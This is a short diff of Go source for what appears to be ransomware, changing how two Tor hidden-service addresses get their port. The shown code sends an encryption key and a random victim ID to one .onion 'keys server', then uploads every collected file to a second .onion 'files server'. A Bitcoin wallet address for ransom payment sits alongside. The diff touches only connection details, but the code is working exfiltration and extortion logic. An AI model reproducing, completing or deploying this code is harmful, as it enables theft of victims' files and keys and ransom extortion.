@@ -23,9 +23,9 @@ import (
 
 var (
 	// ServerBaseURL1 is the server base url injected on compile time(for keys)
-	ServerBaseURL1 string = "nriebxqtxebfhffyybpqtc6r5em3nmmh5ps4dn4dibwxf4ywa6hguxyd.onion"
+	ServerBaseURL1 string = "nriebxqtxebfhffyybpqtc6r5em3nmmh5ps4dn4dibwxf4ywa6hguxyd.onion:3000"
 	// ServerBaseURL2 is the server base url injected on compile time(for files)
-	ServerBaseURL2 string = "wdgffq56zhi25wh73b24p27jdhyyagh7gak3swslic6qiy2fro4seeyd.onion"
+	ServerBaseURL2 string = "wdgffq56zhi25wh73b24p27jdhyyagh7gak3swslic6qiy2fro4seeyd.onion:3000"
 	// Your wallet address
 	Wallet = "17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR"
 	// Your contact email
@@ -65,22 +65,20 @@ func main() {
 	key := []byte(passwd)
 	id, _ := rand.Int(rand.Reader, big.NewInt(1047483647))
 	ID := id.String()
-	srv1 := ServerBaseURL1 + ":3000"
-	srv2 := ServerBaseURL2 + ":3000"
-	sock, err := dialer1.Dial("tcp", srv1) //keys server
+	sock, err := dialer1.Dial("tcp", ServerBaseURL1) //keys server
 	if err != nil {
 		panic(err)
 	}
 	sock.Write(key)
 	sock.Close()
-	con, err := dialer1.Dial("tcp", srv1) //keys server
+	con, err := dialer1.Dial("tcp", ServerBaseURL1) //keys server
 	if err != nil {
 		panic(err)
 	}
 	con.Write([]byte(ID))
 	con.Close()
 	for i := 0; i < len(allfiles); i++ {
-		s, err := dialer2.Dial("tcp", srv2) //files server
+		s, err := dialer2.Dial("tcp", ServerBaseURL2) //files server
 		if err != nil {
 			panic(err)
 		}
